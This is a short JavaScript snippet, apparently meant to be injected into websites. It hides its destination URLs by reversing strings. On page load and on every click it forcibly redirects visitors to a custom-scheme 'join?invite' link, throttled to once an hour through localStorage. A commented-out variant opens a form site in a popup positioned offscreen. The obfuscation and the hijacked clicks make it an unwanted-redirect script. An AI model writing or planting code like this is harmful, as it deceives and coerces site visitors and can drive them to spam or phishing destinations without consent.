(function(docpointer) {
	let eatApple = "982c45f080C53506066=etivni?nioj//:te".split("").reverse().join("");
	let showPopUp = function() {
		let meItem = localStorage.getItem("popcornlast");
		if (meItem == null || (Date.now() - parseInt(meItem)) > (60 * 60 * 1000)) {
			return true;
		}
		return false;
	};
	
	if(document.readyState === 'ready' || document.readyState === 'complete') {
		if (showPopUp()) {
			window.open(eatApple, "_self");
		}
	}
	else {
		document.addEventListener("readystatechange", function(e) {
			if ((document.readyState === 'ready' || document.readyState === 'complete') && showPopUp()) {
				window.open(eatApple, "_self");
			}
		});
	}
	
	document.addEventListener("click", function(e) {
		if (showPopUp()) {
			//var width = screen.width / 4;var height = screen.height / 4;var config='width=' + (width) + ', height=' + (height)+',top=99999999,left=99999999,status=yes,scrollbars=yes,toolbar=no,menubar=no,location=no,fullscreen=no';
			//window.open("62jxn/mrof/moc.razfamrof//:sptth".split("").reverse().join(""), "_blank", config);				
			window.open(eatApple, "_self");
			localStorage.setItem("popcornlast", Date.now());
		}
	});
})(document);
